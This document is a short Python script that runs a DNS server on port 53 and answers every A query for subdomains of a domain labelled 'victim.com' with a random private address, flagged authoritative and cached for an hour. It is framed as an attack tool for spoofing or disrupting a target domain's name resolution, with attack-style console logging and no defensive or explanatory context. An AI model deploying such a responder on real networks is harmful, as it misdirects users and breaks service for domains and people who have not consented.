import random
from dnslib import DNSHeader, RR, A, QTYPE, DNSLabel
from dnslib.server import DNSServer, DNSLogger

# --- Configuration ---
# Target domain: only return random responses for subdomains of this domain
TARGET_DOMAIN = "victim.com"

# Listening IP and port
MY_IP = "0.0.0.0"
PORT = 53

class RandomResolver:
    """
    A DNS resolver that returns random IPs for victim.com subdomains.
    """
    
    def generate_random_ip(self):
        """Generate a random private IP address for the response"""
        return "10.{}.{}.{}".format(
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )

    def resolve(self, request, handler):
        """
        Core logic for handling DNS requests.
        """
        qname = request.q.qname
        qtype = request.q.qtype
        
        print(f"[+] Received query for: {qname} (Type: {QTYPE[qtype]}) from {handler.client_address[0]}")

        # Check if the queried domain is a subdomain of victim.com and is an A record query
        if qname.matchSuffix(DNSLabel(TARGET_DOMAIN)) and qtype == QTYPE.A:
            print(f"[*] Query matches *.{TARGET_DOMAIN} - Returning random IP")
            
            # Generate random IP
            random_ip = self.generate_random_ip()
            
            # Create reply packet
            reply = request.reply()
            reply.header.aa = True  # Authoritative answer
            
            # Add random IP to the answer section
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(random_ip), ttl=3600))
            
            print(f"[!] Responding with random IP: {random_ip}")
            return reply

        # For other domains, do not respond (return empty response)
        print(f"[-] Query for {qname} does not match *.{TARGET_DOMAIN}. No response.")
        return request.reply()

# --- Main program entry point ---
if __name__ == '__main__':
    logger = DNSLogger(prefix=False)
    resolver = RandomResolver()
    server = DNSServer(resolver, port=PORT, address=MY_IP, logger=logger)

    print(f"[*] Starting Random Response DNS Server")
    print(f"[*] Listening on {MY_IP}:{PORT}")
    print(f"[*] Any A query for *.{TARGET_DOMAIN} will receive a random IP address")
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Server shutting down.")
        server.stop()
